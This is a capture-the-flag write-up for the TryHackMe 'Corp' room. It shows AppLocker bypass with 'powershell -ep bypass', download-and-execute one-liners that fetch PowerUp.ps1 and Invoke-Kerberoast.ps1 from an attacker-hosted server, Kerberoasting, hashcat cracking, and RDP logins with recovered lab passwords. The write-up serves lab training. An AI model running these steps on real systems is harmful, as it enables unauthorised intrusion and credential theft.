# Corp

**Room Link:** [https://tryhackme.com/room/corp](https://tryhackme.com/room/corp)



## Bypassing Applocker



Load PowerUp.ps1 into memory.

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**PowerUp.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (3) (3) (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (1) (1) (8).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (11) (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
xfreerdp +clipboard /u:"Administrator" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

<figure><img src="../../.gitbook/assets/image (7) (2) (4).png" alt=""><figcaption></figcaption></figure>

## Kerberoasting

Run the below command from the Administrator account we just got access to.

**Victim(powershell)**

```
setspn -T medin -Q ​ */*
```

<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to Invoke-Kerberoast.ps1 so it runs automatically once downloaded

```
 Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

**Victim(powershell)**

```
powershell -ep bypass
powershell -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.131.240:81/Invoke-Kerberoast.ps1'))"
```

<figure><img src="../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>

Run this to get rid of all the spaces.

**Kali**

```
cat hash.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g' > hash.txt
```

Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

**Kali**

```
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyo.txt --force
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt --force --show
```

<figure><img src="../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
xfreerdp +clipboard /u:"fela" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
Password: rubenF124
```



